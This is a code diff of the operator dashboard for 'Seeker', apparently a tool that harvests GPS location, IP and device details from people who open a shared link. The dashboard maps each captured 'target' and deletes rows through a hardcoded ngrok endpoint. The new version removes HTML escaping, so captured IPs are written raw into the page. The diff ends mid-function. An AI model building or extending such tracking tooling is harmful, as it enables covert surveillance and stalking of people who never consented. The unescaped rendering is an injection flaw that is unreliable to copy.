@@ -2,683 +2,283 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <!-- Prevent stale cached dashboards: always fetch the latest delete logic. -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-  <meta http-equiv="Pragma" content="no-cache" />
-  <meta http-equiv="Expires" content="0" />
-  <title>Seeker — Live Location Dashboard</title>
+  <title>Seeker · Live Tracking</title>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://cdn.jsdelivr.net/npm/leaflet@1.9.4/dist/leaflet.js"></script>
   <style>
     :root {
-      --bg: #0e1117;
-      --panel: #161b22;
-      --panel-2: #1c2430;
-      --border: #2a3441;
-      --text: #e6edf3;
-      --muted: #8b949e;
-      --accent: #2f81f7;
-      --accent-2: #3fb950;
-      --danger: #f85149;
+      --bg: #0e1117; --panel: #161b22; --panel-2: #1c2430;
+      --border: #2a3441; --text: #e6edf3; --muted: #8b949e;
+      --accent: #2f81f7; --success: #3fb950; --danger: #f85149;
     }
-    * { box-sizing: border-box; }
-    html, body { height: 100%; margin: 0; }
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    html, body { height: 100%; overflow: hidden; }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
       background: var(--bg); color: var(--text);
-      display: grid; grid-template-columns: 380px 1fr; height: 100vh; overflow: hidden;
+      display: grid; grid-template-columns: 360px 1fr;
     }
+    
+    /* Sidebar */
     #sidebar {
       background: var(--panel); border-right: 1px solid var(--border);
-      display: flex; flex-direction: column; height: 100vh; overflow: hidden;
+      display: flex; flex-direction: column; height: 100vh;
     }
     header {
-      padding: 16px 18px; border-bottom: 1px solid var(--border);
+      padding: 14px 18px; border-bottom: 1px solid var(--border);
       display: flex; align-items: center; gap: 10px;
+      background: linear-gradient(180deg, var(--panel-2) 0%, var(--panel) 100%);
     }
-    header h1 { font-size: 17px; margin: 0; font-weight: 650; letter-spacing: .2px; }
     header .dot {
-      width: 9px; height: 9px; border-radius: 50%; background: var(--accent-2);
-      box-shadow: 0 0 0 0 rgba(63,185,80,.6); animation: pulse 2s infinite;
+      width: 8px; height: 8px; border-radius: 50%; background: var(--success);
+      box-shadow: 0 0 10px var(--success);
+      animation: pulse 2s infinite;
     }
     @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(63,185,80,.55); }
-      70% { box-shadow: 0 0 0 8px rgba(63,185,80,0); }
-      100% { box-shadow: 0 0 0 0 rgba(63,185,80,0); }
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.7; transform: scale(1.1); }
     }
-
-    /* ---- Tab bar ---- */
-    .tabs {
-      display: flex; border-bottom: 1px solid var(--border);
-    }
-    .tab-btn {
-      flex: 1; padding: 10px 0; font-size: 13px; font-weight: 600;
-      background: none; border: none; border-bottom: 2px solid transparent;
-      color: var(--muted); cursor: pointer; transition: color .15s, border-color .15s;
-      border-radius: 0;
-    }
-    .tab-btn:hover { color: var(--text); filter: none; }
-    .tab-btn.active { color: var(--text); border-bottom-color: var(--accent); }
-    .tab-panel { display: none; flex: 1; flex-direction: column; overflow: hidden; }
-    .tab-panel.active { display: flex; }
-
-    /* ---- Device tab ---- */
+    header h1 { font-size: 16px; font-weight: 600; letter-spacing: 0.3px; }
+    
+    /* Stats */
     .stats {
-      display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 14px 18px;
+      display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
+      padding: 14px 18px; border-bottom: 1px solid var(--border);
+    }
+    .stat {
+      background: var(--panel-2); border: 1px solid var(--border);
+      border-radius: 10px; padding: 12px; text-align: center;
+    }
+    .stat .label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
+    .stat .value { font-size: 22px; font-weight: 700; color: var(--text); }
+    
+    /* Toolbar */
+    .toolbar {
+      display: flex; align-items: center; gap: 8px; padding: 12px 18px;
       border-bottom: 1px solid var(--border);
     }
-    .stat { background: var(--panel-2); border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; }
-    .stat .k { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .6px; }
-    .stat .v { font-size: 20px; font-weight: 650; margin-top: 2px; }
-    .toolbar {
-      display: flex; align-items: center; gap: 8px; padding: 10px 18px;
-      border-bottom: 1px solid var(--border); font-size: 12px; color: var(--muted);
-    }
     .toolbar .spacer { flex: 1; }
-    button {
-      background: var(--accent); color: #fff; border: 0; border-radius: 7px;
-      padding: 7px 12px; font-size: 13px; font-weight: 600; cursor: pointer;
+    .btn {
+      background: var(--accent); color: #fff; border: none;
+      border-radius: 8px; padding: 8px 14px; font-size: 13px;
+      font-weight: 600; cursor: pointer; transition: all 0.15s;
     }
-    button.ghost { background: var(--panel-2); border: 1px solid var(--border); color: var(--text); }
-    button:hover { filter: brightness(1.08); }
-    #list { flex: 1; overflow-y: auto; padding: 8px; }
-    .card {
-      background: var(--panel-2); border: 1px solid var(--border); border-radius: 9px;
-      padding: 11px 12px; margin-bottom: 8px; cursor: pointer; transition: border-color .15s;
+    .btn:active { transform: scale(0.97); }
+    .btn.ghost { background: transparent; border: 1px solid var(--border); color: var(--text); }
+    
+    /* Device List */
+    #deviceList { flex: 1; overflow-y: auto; padding: 12px 18px; }
+    .device-card {
+      background: var(--panel-2); border: 1px solid var(--border);
+      border-radius: 10px; padding: 14px; margin-bottom: 10px;
+      cursor: pointer; transition: all 0.15s;
     }
-    .card:hover { border-color: var(--accent); }
-    .card.active { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent) inset; }
-    .card .row1 { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
-    .card .name { font-weight: 650; font-size: 14px; }
-    .card .badge {
-      font-size: 10px; padding: 2px 7px; border-radius: 20px; background: rgba(47,129,247,.15);
-      color: var(--accent); border: 1px solid rgba(47,129,247,.35); white-space: nowrap;
-    }
-    .card .right { display: flex; align-items: center; gap: 6px; }
-    .card-del {
-      background: transparent; border: 1px solid var(--border); color: var(--danger);
-      padding: 3px 7px; border-radius: 6px; font-size: 12px; line-height: 1;
-      cursor: pointer; flex-shrink: 0;
-    }
-    .card-del:hover { background: var(--danger); color: #fff; filter: none; }
-    .card .meta { font-size: 12px; color: var(--muted); margin-top: 6px; line-height: 1.55; }
-    .card .meta b { color: var(--text); font-weight: 600; }
-    .card .ip { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
-    .empty { color: var(--muted); text-align: center; padding: 40px 20px; font-size: 13px; }
-    .err { color: var(--danger); }
-
-    /* ---- Delete tab ---- */
-    #delete-panel {
-      overflow-y: auto; padding: 14px 18px;
-    }
-    #delete-panel h2 {
-      font-size: 14px; margin: 0 0 12px; font-weight: 650; color: var(--muted);
-      text-transform: uppercase; letter-spacing: .6px;
-    }
-    #delete-stats { font-size: 13px; color: var(--muted); margin-bottom: 12px; }
-    .del-device {
-      background: var(--panel-2); border: 1px solid var(--border); border-radius: 9px;
-      padding: 11px 12px; margin-bottom: 8px;
-      display: flex; justify-content: space-between; align-items: center; gap: 8px;
-    }
-    .del-device-info { flex: 1; min-width: 0; }
-    .del-device-info strong { font-size: 13px; font-weight: 650; display: block; }
-    .del-device-info small { font-size: 11px; color: var(--muted); word-break: break-all; }
-    .del-btn {
-      background: var(--danger); color: #fff; border: none; padding: 7px 12px;
-      border-radius: 7px; font-size: 12px; font-weight: 600; cursor: pointer; flex-shrink: 0;
-    }
-    .del-btn:hover { background: #d0352f; filter: none; }
-    #delete-refresh-btn { margin-bottom: 12px; }
-
-    /* ---- Map ---- */
+    .device-card:hover { border-color: var(--accent); background: rgba(47,129,247,0.08); }
+    .device-card:active { transform: scale(0.98); }
+    .device-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+    .device-name { font-weight: 600; font-size: 14px; display: flex; align-items: center; gap: 8px; }
+    .device-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .device-meta { font-size: 12px; color: var(--muted); line-height: 1.7; }
+    .device-meta b { color: var(--text); font-weight: 600; }
+    .empty { text-align: center; color: var(--muted); padding: 40px 20px; font-size: 13px; }
+    
+    /* Map */
     #map { height: 100vh; width: 100%; }
-    .leaflet-popup-content { font-size: 13px; line-height: 1.55; }
-    .leaflet-popup-content b { color: #0e1117; }
-
-    @media (max-width: 720px) {
-      body { grid-template-columns: 1fr; grid-template-rows: 45vh 55vh; }
-      #sidebar { height: auto; }
-      #map { height: 100%; }
+    
+    /* Status bar */
+    .status-bar {
+      padding: 10px 18px; border-top: 1px solid var(--border);
+      font-size: 12px; color: var(--muted); text-align: center;
+      background: var(--panel-2);
     }
+    .status-bar b { color: var(--success); }
+    
+    /* iPhone Responsive */
+    @media (max-width: 768px) {
+      body { grid-template-columns: 1fr; grid-template-rows: 50vh 50vh; }
+      #sidebar { height: auto; border-right: none; border-bottom: 1px solid var(--border); }
+      #map { height: 50vh; }
+      .stats { grid-template-columns: 1fr 1fr; }
+      header h1 { font-size: 15px; }
+    }
+    
+    @media (max-width: 480px) {
+      body { grid-template-rows: 45vh 55vh; }
+      .stats { padding: 10px 14px; gap: 8px; }
+      .stat { padding: 10px; border-radius: 8px; }
+      .stat .value { font-size: 18px; }
+      .stat .label { font-size: 10px; }
+      header { padding: 12px 14px; }
+      #deviceList { padding: 10px 14px; }
+      .device-card { padding: 12px; border-radius: 8px; }
+    }
+    
+    /* Leaflet popup styling */
+    .leaflet-popup-content-wrapper {
+      background: var(--panel-2); color: var(--text);
+      border: 1px solid var(--border); border-radius: 8px;
+    }
+    .leaflet-popup-tip { background: var(--panel-2); }
+    .leaflet-popup-content { margin: 12px; font-size: 13px; line-height: 1.6; }
   </style>
 </head>
 <body>
   <div id="sidebar">
     <header>
-      <span class="dot"></span>
+      <div class="dot"></div>
       <h1>Seeker · Live Tracking</h1>
     </header>
-
-    <!-- Tab bar -->
-    <div class="tabs">
-      <button class="tab-btn active" data-tab="device">Device</button>
-      <button class="tab-btn" data-tab="delete">Delete</button>
+    
+    <div class="stats">
+      <div class="stat">
+        <div class="label">Devices</div>
+        <div class="value" id="deviceCount">0</div>
+      </div>
+      <div class="stat">
+        <div class="label">Located</div>
+        <div class="value" id="locatedCount">0</div>
+      </div>
     </div>
-
-    <!-- Device tab -->
-    <div class="tab-panel active" id="tab-device">
-      <div class="stats">
-        <div class="stat"><div class="k">Devices</div><div class="v" id="statCount">—</div></div>
-        <div class="stat"><div class="k">Located</div><div class="v" id="statLocated">—</div></div>
-      </div>
-      <div class="toolbar">
-        <span id="status">Initializing…</span>
-        <span class="spacer"></span>
-        <button class="ghost" id="fitBtn" title="Zoom to fit all markers">Fit</button>
-        <button id="refreshBtn">Refresh</button>
-      </div>
-      <div id="list"><div class="empty">Loading device data…</div></div>
+    
+    <div class="toolbar">
+      <button class="btn ghost" id="fitBtn">Fit</button>
+      <button class="btn" id="refreshBtn">Refresh</button>
+      <div class="spacer"></div>
     </div>
-
-    <!-- Delete tab -->
-    <div class="tab-panel" id="tab-delete">
-      <div id="delete-panel">
-        <h2>Manage Devices</h2>
-        <div id="delete-stats">Loading…</div>
-        <button class="ghost" id="delete-refresh-btn">Reload list</button>
-        <div id="delete-list"></div>
-      </div>
+    
+    <div id="deviceList">
+      <div class="empty">Loading device data…</div>
+    </div>
+    
+    <div class="status-bar">
+      Updated: <b id="lastUpdate">--:--:--</b> · Auto-refresh 10s
     </div>
   </div>
-
+  
   <div id="map"></div>
 
   <script>
-  (function () {
-    'use strict';
-
-    var POLL_MS = 10000;
-    var DATA_URL = 'db/results.csv';
-
-    // Server-side delete endpoint (seeker/delete_handler.php). Relative by
-    // default so it works when the dashboard is served from the same PHP host
-    // as the CSV. When the dashboard is on GitHub Pages (static, no PHP), point
-    // this at the PHP host, e.g. 'https://<ngrok-id>.ngrok-free.app/delete_handler.php'.
-    // If the endpoint is unreachable, delete falls back to a CSV download.
-    var DELETE_ENDPOINT = 'https://trapezoid-tributary-deny.ngrok-free.dev/delete_handler.php';
-    var DELETE_TOKEN = '';   // set if delete_handler.php has ADMIN_TOKEN enabled
-
-    // Guard: if the Leaflet CDN failed to load, L is undefined and every
-    // downstream call would throw, leaving the page stuck on "Loading…".
-    // Surface a clear message instead of a silent blank map.
-    if (typeof L === 'undefined') {
-      var mapEl = document.getElementById('map');
-      if (mapEl) {
-        mapEl.style.display = 'flex';
-        mapEl.style.alignItems = 'center';
-        mapEl.style.justifyContent = 'center';
-        mapEl.style.color = '#8b949e';
-        mapEl.style.padding = '20px';
-        mapEl.style.textAlign = 'center';
-        mapEl.innerHTML = 'Map library failed to load.<br>Check your network connection and reload.';
-      }
-      var listEl = document.getElementById('list');
-      if (listEl) {
-        listEl.innerHTML = '<div class="empty err">Map library (Leaflet) failed to load from the CDN.</div>';
-      }
-      var statusEl = document.getElementById('status');
-      if (statusEl) { statusEl.textContent = 'Map library failed to load'; statusEl.className = 'err'; }
-      return; // abort init — nothing below can work without Leaflet
+    // Device colors
+    const COLORS = ['#3b82f6', '#ef4444', '#22c55e', '#f97316', '#a855f7', '#ec4899', '#14b8a6', '#06b6d4', '#f43f5e', '#8b5cf6'];
+    
+    let map, markers = {}, devices = [];
+    
+    // Initialize map
+    function initMap() {
+      map = L.map('map', { zoomControl: true }).setView([29.3759, 47.9774], 10);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '© OpenStreetMap',
+        maxZoom: 19
+      }).addTo(map);
     }
-
-    // Initialize the map FIRST so it always renders, independent of whether
-    // the device-data fetch below succeeds.
-    var map = L.map('map', { zoomControl: true }).setView([29.315, 48.020], 6);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      maxZoom: 19,
-      attribution: '&copy; OpenStreetMap contributors'
-    }).addTo(map);
-
-    var markers = [];
-    var devices = [];
-    var activeIdx = -1;
-    var didInitialFit = false;
-
-    /* ---- Tab switching ---- */
-    document.querySelectorAll('.tab-btn').forEach(function (btn) {
-      btn.addEventListener('click', function () {
-        document.querySelectorAll('.tab-btn').forEach(function (b) { b.classList.remove('active'); });
-        document.querySelectorAll('.tab-panel').forEach(function (p) { p.classList.remove('active'); });
-        btn.classList.add('active');
-        document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
-        if (btn.dataset.tab === 'delete') loadDeleteList();
-      });
-    });
-
-    /* ---- CSV parser (shared) ---- */
-    function parseCsvLine(line) {
-      var out = [], cur = '', inQ = false;
-      for (var i = 0; i < line.length; i++) {
-        var c = line[i];
-        if (inQ) {
-          if (c === '"') {
-            if (line[i + 1] === '"') { cur += '"'; i++; }
-            else inQ = false;
-          } else cur += c;
-        } else {
-          if (c === '"') inQ = true;
-          else if (c === ',') { out.push(cur); cur = ''; }
-          else cur += c;
-        }
-      }
-      out.push(cur);
-      return out;
-    }
-
-    function num(v) {
-      if (v == null) return NaN;
-      var m = String(v).replace(/[^\d.\-]/g, '');
-      return parseFloat(m);
-    }
-
-    function parseRow(cols, idx) {
-      // results.csv has no id column, so a device's id is its 1-based line
-      // position — the same key delete_handler.php uses to locate the row.
-      var d = {
-        devnum: String((idx || 0) + 1),
-        os: cols[0] || '',
-        platform: cols[1] || '', cores: cols[2] || '',
-        ram: cols[3] || '', vendor: cols[4] || '', gpu: cols[5] || '',
-        res: cols[6] || '', ua: cols[7] || '', ip: cols[8] || '',
-        geo: '', lat: NaN, lon: NaN, acc: '', alt: '', dir: '', spd: ''
-      };
-      var latIdx = -1;
-      for (var i = 9; i < cols.length - 1; i++) {
-        if (/deg\s*$/i.test(cols[i]) && /deg\s*$/i.test(cols[i + 1] || '')) { latIdx = i; break; }
-      }
-      if (latIdx === -1) {
-        for (var j = cols.length - 1; j >= 9; j--) {
-          if (/deg\s*$/i.test(cols[j])) { latIdx = Math.max(9, j - 1); break; }
-        }
-      }
-      if (latIdx >= 15) {
-        var g = cols.slice(9, 15).filter(function (x) { return x && x !== 'Not Available'; });
-        var loc = [cols[12], cols[11], cols[10]].filter(function (x) { return x && x !== 'Not Available'; });
-        d.geo = loc.join(', ');
-        d.org = cols[13] || ''; d.isp = cols[14] || '';
-      }
-      if (latIdx >= 0) {
-        d.lat = num(cols[latIdx]);
-        d.lon = num(cols[latIdx + 1]);
-        d.acc = cols[latIdx + 2] || '';
-        d.alt = cols[latIdx + 3] || '';
-        d.dir = cols[latIdx + 4] || '';
-        d.spd = cols[latIdx + 5] || '';
-      }
-      d.hasLoc = isFinite(d.lat) && isFinite(d.lon) &&
-                 Math.abs(d.lat) <= 90 && Math.abs(d.lon) <= 180;
-      return d;
-    }
-
-    function shortUA(ua) { return ua || 'Unknown'; }
-
-    function accStr(a) {
-      var n = num(a);
-      if (!isFinite(n)) return a || '—';
-      return n >= 1000 ? (n / 1000).toFixed(1) + ' km' : Math.round(n) + ' m';
-    }
-
-    function esc(s) {
-      return String(s == null ? '' : s)
-        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-    }
-
-    function popupHtml(d, idx) {
-      return '<b>Device #' + (idx + 1) + '</b><br>' +
-        '<b>IP:</b> ' + esc(d.ip) + '<br>' +
-        (d.geo ? '<b>Location:</b> ' + esc(d.geo) + '<br>' : '') +
-        '<b>Coords:</b> ' + d.lat.toFixed(6) + ', ' + d.lon.toFixed(6) + '<br>' +
-        '<b>Accuracy:</b> ' + esc(accStr(d.acc)) + '<br>' +
-        '<b>OS:</b> ' + esc(d.os) + ' &middot; <b>' + esc(d.platform) + '</b><br>' +
-        '<b>Browser:</b> ' + esc(shortUA(d.ua)) + '<br>' +
-        '<b>Screen:</b> ' + esc(d.res) +
-        '<br><a href="https://www.google.com/maps/place/' + d.lat + ',' + d.lon +
-        '" target="_blank" rel="noopener">Open in Google Maps ↗</a>';
-    }
-
-    function cardHtml(d, idx) {
-      var title = d.geo || (d.hasLoc ? 'Located device' : 'No GPS fix');
-      var badge = d.hasLoc ? accStr(d.acc) + ' acc' : 'no fix';
-      return '' +
-        '<div class="row1"><span class="name">#' + (idx + 1) + ' · ' + esc(title) + '</span>' +
-        '<span class="right"><span class="badge">' + esc(badge) + '</span>' +
-        '<button class="card-del" title="Delete this device" data-devnum="' + esc(d.devnum) + '">🗑️</button>' +
-        '</span></div>' +
-        '<div class="meta">' +
-        '<span class="ip">' + esc(d.ip) + '</span><br>' +
-        '<b>' + esc(d.os) + '</b> · ' + esc(d.ua) + '<br>' +
-        (d.hasLoc ? d.lat.toFixed(5) + ', ' + d.lon.toFixed(5) : '<span class="err">location unavailable</span>') +
-        ' · ' + esc(d.res) +
-        '</div>';
-    }
-
-    function focusDevice(idx) {
-      activeIdx = idx;
-      var d = devices[idx];
-      var cards = document.querySelectorAll('#list .card');
-      cards.forEach(function (c, i) { c.classList.toggle('active', i === idx); });
-      if (d && d.hasLoc && markers[idx]) {
-        map.setView([d.lat, d.lon], Math.max(map.getZoom(), 15));
-        markers[idx].openPopup();
+    
+    // Load devices from CSV
+    async function loadDevices() {
+      try {
+        const res = await fetch('db/results.csv?' + Date.now());
+        const text = await res.text();
+        const lines = text.trim().split('\n').slice(1); // Skip header
+        
+        devices = lines.map(line => {
+          const cols = line.split(/,(?=(?:(?:[^"]*"){2})*[^"]*$)/);
+          const lat = parseFloat(cols[14]) || 0;
+          const lon = parseFloat(cols[15]) || 0;
+          const acc = parseFloat(cols[16]) || 0;
+          const device = cols[0].replace(/"/g, '') || 'Unknown';
+          const ip = cols[8].replace(/"/g, '') || 'Unknown';
+          return { lat, lon, acc, device, ip };
+        }).filter(d => d.lat && d.lon);
+        
+        updateUI();
+      } catch (e) {
+        console.error('Load failed:', e);
+        document.getElementById('deviceList').innerHTML = '<div class="empty">Waiting for location data…</div>';
       }
     }
-
-    function render() {
-      var located = devices.filter(function (d) { return d.hasLoc; }).length;
-      document.getElementById('statCount').textContent = devices.length;
-      document.getElementById('statLocated').textContent = located;
-
-      markers.forEach(function (m) { if (m) map.removeLayer(m); });
-      markers = [];
-      devices.forEach(function (d, i) {
-        if (d.hasLoc) {
-          var m = L.marker([d.lat, d.lon]).addTo(map).bindPopup(popupHtml(d, i));
-          m.on('click', function () { focusDevice(i); });
-          markers[i] = m;
-        } else {
-          markers[i] = null;
-        }
-      });
-
-      var list = document.getElementById('list');
-      if (!devices.length) {
-        list.innerHTML = '<div class="empty">No devices captured yet.<br>Waiting for a target to open the link…</div>';
-      } else {
-        list.innerHTML = '';
-        devices.forEach(function (d, i) {
-          var el = document.createElement('div');
-          el.className = 'card' + (i === activeIdx ? ' active' : '');
-          el.innerHTML = cardHtml(d, i);
-          el.addEventListener('click', function () { focusDevice(i); });
-          var delBtn = el.querySelector('.card-del');
-          if (delBtn) {
-            delBtn.addEventListener('click', function (ev) {
-              ev.stopPropagation();
-              deleteDevice(d.devnum, i);
-            });
-          }
-          list.appendChild(el);
-        });
+    
+    // Update UI
+    function updateUI() {
+      const deviceCount = document.getElementById('deviceCount');
+      const locatedCount = document.getElementById('locatedCount');
+      const lastUpdate = document.getElementById('lastUpdate');
+      const list = document.getElementById('deviceList');
+      
+      deviceCount.textContent = devices.length;
+      locatedCount.textContent = devices.filter(d => d.lat).length;
+      lastUpdate.textContent = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      
+      if (devices.length === 0) {
+        list.innerHTML = '<div class="empty">No devices yet. Share the fleet link!</div>';
+        return;
       }
-
-      if (!didInitialFit) {
-        var pts = markers.filter(Boolean).map(function (m) { return m.getLatLng(); });
-        if (pts.length) { map.fitBounds(L.latLngBounds(pts).pad(0.25)); didInitialFit = true; }
-      }
-    }
-
-    function fitAll() {
-      var pts = markers.filter(Boolean).map(function (m) { return m.getLatLng(); });
-      if (pts.length === 1) map.setView(pts[0], 15);
-      else if (pts.length) map.fitBounds(L.latLngBounds(pts).pad(0.25));
-    }
-
-    function setStatus(txt, isErr) {
-      var el = document.getElementById('status');
-      el.textContent = txt;
-      el.className = isErr ? 'err' : '';
-    }
-
-    function timeStr() {
-      var d = new Date();
-      return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    }
-
-    function load() {
-      fetch(DATA_URL + '?_=' + Date.now(), { cache: 'no-store' })
-        .then(function (r) {
-          if (!r.ok) throw new Error('HTTP ' + r.status);
-          return r.text();
-        })
-        .then(function (text) {
-          var lines = text.split(/\r?\n/).filter(function (l) { return l.trim().length; });
-          devices = lines.map(function (l, i) { return parseRow(parseCsvLine(l), i); });
-          render();
-          setStatus('Updated ' + timeStr() + ' · every ' + (POLL_MS / 1000) + 's', false);
-        })
-        .catch(function (e) {
-          setStatus('Fetch failed: ' + e.message, true);
-          if (!devices.length) {
-            document.getElementById('list').innerHTML =
-              '<div class="empty err">Could not load <code>' + DATA_URL + '</code>.<br>' +
-              'Serve this page from the seeker directory so <code>db/results.csv</code> is reachable.</div>';
-          }
-        });
-    }
-
-    document.getElementById('refreshBtn').addEventListener('click', load);
-    document.getElementById('fitBtn').addEventListener('click', fitAll);
-
-    load();
-    setInterval(load, POLL_MS);
-
-    /* ---- Delete tab logic ---- */
-    function loadDeleteList() {
-      var statsEl = document.getElementById('delete-stats');
-      var listEl = document.getElementById('delete-list');
-      statsEl.textContent = 'Loading…';
-      listEl.innerHTML = '';
-
-      fetch(DATA_URL + '?_=' + Date.now(), { cache: 'no-store' })
-        .then(function (r) {
-          if (!r.ok) throw new Error('HTTP ' + r.status);
-          return r.text();
-        })
-        .then(function (text) {
-          var lines = text.split(/\r?\n/).filter(function (l) { return l.trim(); });
-          statsEl.textContent = lines.length + ' device(s) found';
-
-          lines.forEach(function (line, idx) {
-            var cols = parseCsvLine(line);
-            if (cols.length < 9) return;
-
-            // Device id == 1-based line position in results.csv (the file has
-            // no id column), matching how delete_handler.php locates the row.
-            var devnum = String(idx + 1);
-            var first = cols[0] || '';
-            var os = first || 'Unknown';
-            var ip = cols[8] || 'Unknown';
-            var lat = '', lon = '';
-            for (var i = 9; i < cols.length - 1; i++) {
-              if (/deg\s*$/i.test(cols[i]) && /deg\s*$/i.test(cols[i + 1] || '')) {
-                lat = cols[i]; lon = cols[i + 1]; break;
-              }
-            }
-
-            var div = document.createElement('div');
-            div.className = 'del-device';
-            div.innerHTML =
-              '<div class="del-device-info">' +
-                '<strong>#' + esc(devnum) + ' · ' + esc(os.substring(0, 50)) + '</strong><br>' +
-                '<small>IP: ' + esc(ip) + (lat ? ' | ' + esc(lat) + ', ' + esc(lon) : '') + '</small>' +
-              '</div>' +
-              '<button class="del-btn">Delete</button>';
-            div.querySelector('.del-btn').addEventListener('click', function () {
-              // Use the exact same delete path as the card trash icon:
-              // resolve this device's index in the main list so it gets the
-              // same optimistic removal + server-side delete "new experience".
-              var mainIdx = devices.findIndex(function (dv) { return dv.devnum === devnum; });
-              deleteDevice(devnum, mainIdx);
-            });
-            listEl.appendChild(div);
-          });
-        })
-        .catch(function (e) {
-          statsEl.textContent = 'Error: ' + e.message;
-        });
-    }
-
-    // Unified delete: hit the PHP endpoint (real server-side delete on the CSV),
-    // with optimistic UI removal from the main list. If the endpoint isn't
-    // reachable (e.g. dashboard on static GitHub Pages), fall back to a
-    // CSV-download flow so the operator can still update the file manually.
-    function postDelete(devnum) {
-      var url = DELETE_ENDPOINT + '?device=' + encodeURIComponent(devnum) +
-        (DELETE_TOKEN ? '&token=' + encodeURIComponent(DELETE_TOKEN) : '') +
-        '&_=' + Date.now();
-      return fetch(url, { method: 'DELETE', cache: 'no-store' }).then(function (r) {
-        return r.text().then(function (t) {
-          var j = null;
-          try { j = JSON.parse(t); } catch (e) {}
-          if (!r.ok || !j || !j.ok) {
-            throw new Error(j && j.error ? j.error : ('HTTP ' + r.status));
-          }
-          return j;
-        });
+      
+      list.innerHTML = '';
+      devices.forEach((device, i) => {
+        const color = COLORS[i % COLORS.length];
+        const card = document.createElement('div');
+        card.className = 'device-card';
+        card.onclick = () => focusDevice(i);
+        card.innerHTML = `
+          <div class="device-header">
+            <span class="device-name">
+              <span class="device-dot" style="background:${color}"></span>
+              Device ${i + 1}
+            </span>
+          </div>
+          <div class="device-meta">
+            <b>${device.lat.toFixed(5)}, ${device.lon.toFixed(5)}</b><br>
+            Accuracy: ${Math.round(device.acc)}m<br>
+            IP: ${device.ip}
+          </div>
+        `;
+        list.appendChild(card);
+        updateMarker(device, color, i);
       });
     }
-
-    function deleteDevice(devnum, mainIdx) {
-      if (!confirm('Delete device #' + devnum + '?\nThis removes it from results.csv.')) return;
-
-      // Optimistic removal from the main device list.
-      var snapshot = devices.slice();
-      if (typeof mainIdx === 'number' && mainIdx >= 0 && mainIdx < devices.length) {
-        devices.splice(mainIdx, 1);
-        if (activeIdx === mainIdx) activeIdx = -1;
-        render();
-      }
-      setStatus('Deleting device #' + devnum + '…', false);
-
-      postDelete(devnum)
-        .then(function (j) {
-          setStatus('Deleted #' + devnum + ' · ' + j.remaining + ' remaining', false);
-          load(); // authoritative re-sync from server
-          if (document.getElementById('tab-delete').classList.contains('active')) {
-            loadDeleteList();
-          }
-        })
-        .catch(function (e) {
-          // Roll back the optimistic change, then offer the download fallback.
-          devices = snapshot;
-          render();
-          setStatus('Server delete unavailable (' + e.message + ') — download fallback', true);
-          downloadCsvWithout(devnum);
-        });
-    }
-
-    // Fallback for static hosting: build an updated CSV client-side and
-    // download it so the operator can replace seeker/db/results.csv by hand.
-    function downloadCsvWithout(devnum) {
-      fetch(DATA_URL + '?_=' + Date.now(), { cache: 'no-store' })
-        .then(function (r) { return r.text(); })
-        .then(function (text) {
-          var lines = text.split(/\r?\n/).filter(function (l) { return l.trim(); });
-          var kept = lines.filter(function (l) {
-            var m = l.match(/^(\d+)\t/);
-            return !(m && m[1] === String(devnum));
-          });
-          var csv = kept.length ? kept.join('\n') + '\n' : '';
-          var url = URL.createObjectURL(new Blob([csv], { type: 'text/csv' }));
-          var a = document.createElement('a');
-          a.href = url; a.download = 'results.csv'; a.click();
-          URL.revokeObjectURL(url);
-          alert('Server-side delete is not available on this host.\n\n' +
-                'Downloaded an updated results.csv with device #' + devnum + ' removed.\n' +
-                'Replace seeker/db/results.csv with it — the 10s sync will push it to GitHub.');
-          if (document.getElementById('tab-delete').classList.contains('active')) {
-            loadDeleteList();
-          }
-        })
-        .catch(function (e) { alert('Delete failed: ' + e.message); });
-    }
-
-    document.getElementById('delete-refresh-btn').addEventListener('click', loadDeleteList);
-
-    /* ---- Client-side live location (this browser) ---- */
-    // Shows where the person VIEWING this dashboard is, using the browser's
-    // Geolocation API. This is independent of the captured device list above.
-    var meMarker = null;   // Leaflet marker for our own position
-    var meCircle = null;   // accuracy circle around it
-
-    // Small status control pinned to the map (bottom-left) so it never
-    // interferes with the sidebar's existing device-status line.
-    var geoControl = L.control({ position: 'bottomleft' });
-    geoControl.onAdd = function () {
-      var div = L.DomUtil.create('div', 'me-status');
-      div.style.cssText =
-        'background:#161b22;border:1px solid #2a3441;border-radius:8px;' +
-        'padding:6px 10px;font:12px/1.4 sans-serif;color:#e6edf3;' +
-        'box-shadow:0 1px 4px rgba(0,0,0,.4);max-width:260px;';
-      div.id = 'me-status';
-      div.textContent = 'Locating…';
-      return div;
-    };
-    geoControl.addTo(map);
-
-    function setMeStatus(txt, isErr) {
-      var el = document.getElementById('me-status');
